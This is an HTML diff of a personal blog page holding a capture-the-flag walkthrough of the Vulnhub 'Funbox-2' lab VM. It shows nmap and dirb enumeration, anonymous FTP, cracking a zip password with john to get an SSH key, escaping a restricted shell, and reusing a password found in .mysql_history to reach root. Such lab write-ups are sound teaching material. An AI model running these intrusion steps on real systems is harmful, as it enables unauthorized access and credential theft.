@@ -1,11 +1,59 @@
 <!DOCTYPE html>
-<html><head><script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/8.4.6/mermaid.min.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}});</script><script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/latest.js?config=TeX-MML-AM_CHTML"></script><link rel="stylesheet" href="static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script><link rel="stylesheet" href="static/light.css"/></head><body>
-<a href="../boxesfolder.html" style="padding: 5px; color: black; position: absolute;">BACK</a><br>
-<img src="images/crazyeights.png" style="display: block; padding: 5px 0px; width: 50%; margin: auto; margin-top: 5px;">
-<h1>Vulnhub: Funbox-2</h1>
-<h6>Oct 11 2020</h6>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>crazyeights225</title>
+   
+    <link rel="stylesheet" href="../assets/bulma.min.css">
+    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
+    <style>
+      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
+    </style>
+  </head>
+  <body>
+    <div id="app" class="mt-2">
+        <nav class="navbar container" role="navigation" aria-label="main navigation">
+            <div class="navbar-brand">
+              <a class="navbar-item" href="/">
+                <img src="../assets/logo.png">
+              </a>
+              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+              </a>
+            </div>
+            <div id="navbar" class="navbar-menu">
+              <div class="navbar-start">
+                    <a href="../index.html" class="navbar-item">Posts</a>
+                    <a href="../projects.html" class="navbar-item">Projects</a>
+              </div>
+            </div>
+          </nav>
+    </div>
+    <div class="hero-body mt-2" style="background-color: #285aff;">
+        <div class="container has-text-centered">
+            <h1 class="title" style="color: #f1f1f1;">
+                Vulnhub: Funbox-2
+            </h1>
+            <h2 class="subtitle" style="color: #f1f1f1;">
+                Dec, 2020
+            </h2>
+        </div>
+    </div>
+</section>
+<section class="container mt-2">
+<div class="content column is-10">
+    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
+        <ul>
+          <li><a href="../index.html">Posts</a></li>
+          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
+          <li class="is-active"><a href="#" aria-current="page">Funbox-2</a></li>
+        </ul>
+      </nav>
 <h3>Scanning</h3>
-<pre><code>crazyeights@es-base:~$ nmap -PS 192.168.56.1-255
+<pre><code><span>crazyeights@es-base:~$ nmap -PS 192.168.56.1-255
 Nmap scan report for 192.168.56.117
 Host is up (0.000086s latency).
 Not shown: 997 closed ports
@@ -13,9 +61,9 @@ PORT   STATE SERVICE
 21/tcp open  ftp
 22/tcp open  ssh
 80/tcp open  http
-</code></pre>
+</span></code></pre>
 <h5>Focused Scan:</h5>
-<pre><code>crazyeights@es-base:~$ nmap -A -p- 192.168.56.117
+<pre><code><span>crazyeights@es-base:~$ nmap -A -p- 192.168.56.117
 
 Not shown: 65532 closed ports
 PORT   STATE SERVICE VERSION
@@ -44,23 +92,23 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Apache2 Ubuntu Default Page: It works
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre>
+</span></code></pre>
 <h4>Web Enumeration</h4>
 <p>Nothing on web server:</p>
-<pre><code>crazyeights@es-base:~$ dirb http://192.168.56.117
+<pre><code><span>crazyeights@es-base:~$ dirb http://192.168.56.117
 
 ---- Scanning URL: http://192.168.56.117/ ----
 + http://192.168.56.117/index.html (CODE:200|SIZE:10918)                       
 + http://192.168.56.117/robots.txt (CODE:200|SIZE:17)                          
 + http://192.168.56.117/server-status (CODE:403|SIZE:279)                      
                                                             
-</code></pre>
+</span></code></pre>
 <ul>
 <li>the disallowed entry (/logs/) in robots.txt doesn't exist.</li>
 </ul>
 <h4>Checking out FTP:</h4>
 <p>Anonymous login:</p>
-<pre><code>crazyeights@es-base:~$ ftp 192.168.56.117
+<pre><code><span>crazyeights@es-base:~$ ftp 192.168.56.117
 Connected to 192.168.56.117.
 220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.56.117]
 Name (192.168.56.117:crazyeights): anonymous
@@ -76,13 +124,13 @@ Password:
 230 Anonymous access granted, restrictions apply
 Remote system type is UNIX.
 Using binary mode to transfer files.
-</code></pre>
+</span></code></pre>
 <p>Downloading anna.zip:</p>
-<pre><code>local: anna.zip remote: anna.zip
+<pre><code><span>local: anna.zip remote: anna.zip
 200 PORT command successful
 150 Opening BINARY mode data connection for anna.zip (1477 bytes)
 226 Transfer complete
-</code></pre>
+</span></code></pre>
 <ul>
 <li>It is password protected.</li>
 <li>Trying to get the password:</li>
@@ -91,28 +139,28 @@ Using binary mode to transfer files.
 <ul>
 <li>Cracking the hash:</li>
 </ul>
-<pre><code>crazyeights@es-base:~$ john --wordlist=lists/rockyou.txt --rules anna_hash.txt 
+<pre><code><span>crazyeights@es-base:~$ john --wordlist=lists/rockyou.txt --rules anna_hash.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
 Will run 16 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 0g 0:00:00:47 DONE (2020-10-11 13:18) 0g/s 4869Kp/s 4869Kc/s 4869KC/s Bubbydoding..Aaaaaaaaaaaaing
 Session completed
-</code></pre>
+</span></code></pre>
 <p>Didn't get it. It is likely a rabbit hole.</p>
 <h5>Trying tom.zip because it is the only entry you can't write to:</h5>
 <p><code>-r--r--r--   1 ftp      ftp          1477 Jul 25 10:44 tom.zip</code></p>
-<pre><code>ftp&gt; get tom.zip
+<pre><code><span>ftp&gt; get tom.zip
 local: tom.zip remote: tom.zip
 200 PORT command successful
 150 Opening BINARY mode data connection for tom.zip (1477 bytes)
 226 Transfer complete
 1477 bytes received in 0.04 secs (39.8768 kB/s)
-</code></pre>
+</span></code></pre>
 <h4>Getting the hash:</h4>
 <p><code>crazyeights@es-base:~$ zip2john tom.zip &gt; tom_hash.txt</code></p>
 <h4>Cracking the hash:</h4>
-<pre><code>crazyeights@es-base:~$ john --wordlist=lists/rockyou.txt --rules tom_hash.txt
+<pre><code><span>crazyeights@es-base:~$ john --wordlist=lists/rockyou.txt --rules tom_hash.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
 Will run 16 OpenMP threads
@@ -122,39 +170,39 @@ iubire           (tom.zip/id_rsa)
 Use the &quot;--show&quot; option to display all of the cracked passwords reliably
 Session completed
 crazyeights@es-base:~$ 
-</code></pre>
+</span></code></pre>
 <h4>Decompressing the archive gives you:</h4>
-<pre><code>50333540 -rw------- 1 crazyeights crazyeights 1675 Jul 25 06:42 id_rsa
-</code></pre>
+<pre><code><span>50333540 -rw------- 1 crazyeights crazyeights 1675 Jul 25 06:42 id_rsa
+</span></code></pre>
 <h4>Logging in to ssh:</h4>
-<pre><code>crazyeights@es-base:~$ ssh -i id_rsa tom@192.168.56.117
+<pre><code><span>crazyeights@es-base:~$ ssh -i id_rsa tom@192.168.56.117
 load pubkey &quot;id_rsa&quot;: invalid format
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
 
 
 Last login: Sun Oct 11 20:33:26 2020 from 192.168.56.1
 tom@funbox2:~$ 
-</code></pre>
+</span></code></pre>
 <h4>Escaping rbash:</h4>
-<pre><code>tom@funbox2:~$ cd /var/www/html
+<pre><code><span>tom@funbox2:~$ cd /var/www/html
 -rbash: cd: restricted
 tom@funbox2:~$ echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 tom@funbox2:~$ bash -i
 tom@funbox2:~$ cd /var/www/html
-</code></pre>
+</span></code></pre>
 <h3>Poking around:</h3>
 <p>Nothing else on th web server:</p>
-<pre><code>tom@funbox2:~$ cd /var/www/html
+<pre><code><span>tom@funbox2:~$ cd /var/www/html
 tom@funbox2:/var/www/html$ ls
 index.html  robots.txt
-</code></pre>
+</span></code></pre>
 <p>No other users:</p>
-<pre><code>tom@funbox2:/home$ ls
+<pre><code><span>tom@funbox2:/home$ ls
 tom
-</code></pre>
+</span></code></pre>
 <p>Checking out .mysql_history</p>
-<pre><code>_HiStOrY_V2_
+<pre><code><span>_HiStOrY_V2_
 show\040databases;
 quit
 create\040database\040'support';
@@ -169,13 +217,13 @@ show\040tables;
 select\040*\040from\040support;
 insert\040into\040support\040(tom,\040xx11yy22!);
 quit
-</code></pre>
+</span></code></pre>
 <ul>
 <li>You can see there is what might be a password on the line insert into support ...</li>
 <li>tom:xx11yy22!</li>
 </ul>
 <h3>Logging into mysql server:</h3>
-<pre><code>tom@funbox2:~$ mysql -u tom -p'xx11yy22!'
+<pre><code><span>tom@funbox2:~$ mysql -u tom -p'xx11yy22!'
 mysql: [Warning] Using a password on the command line interface can be insecure.
 Welcome to the MySQL monitor.  Commands end with ; or \g.
 Your MySQL connection id is 3
@@ -185,21 +233,21 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
 mysql&gt; 
 [SNIP] - NOTHING INTERESTING
-</code></pre>
+</span></code></pre>
 <p>Using the same password as mySQL:</p>
-<pre><code>tom@funbox2:~$ sudo -l
+<pre><code><span>tom@funbox2:~$ sudo -l
 [sudo] password for tom: 
 Matching Defaults entries for tom on funbox2:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User tom may run the following commands on funbox2:
     (ALL : ALL) ALL
-</code></pre>
+</span></code></pre>
 <h3>Getting the root flag:</h3>
-<pre><code>tom@funbox2:~$ sudo su
+<pre><code><span>tom@funbox2:~$ sudo su
 root@funbox2:/home/tom# 
-</code></pre>
-<pre><code>root@funbox2:/home/tom# cd /root
+</span></code></pre>
+<pre><code><span>root@funbox2:/home/tom# cd /root
 root@funbox2:~# ls
 flag.txt
 root@funbox2:~# cat flag.txt 
@@ -213,7 +261,16 @@ root@funbox2:~# cat flag.txt
                                                               
 from @0815R2d2 with ♥
 root@funbox2:~# 
-</code></pre>
+</span></code></pre>
 <h4>FIN.</h4>
-
-</body></html>
+</div>
+</section>
+<footer class="footer">
+    <div class="container">
+        <div class="columns">
+            <div class="column is-3 is-offset-2">
+        </div>
+    </div>
+</footer>
+</body>
+</html>
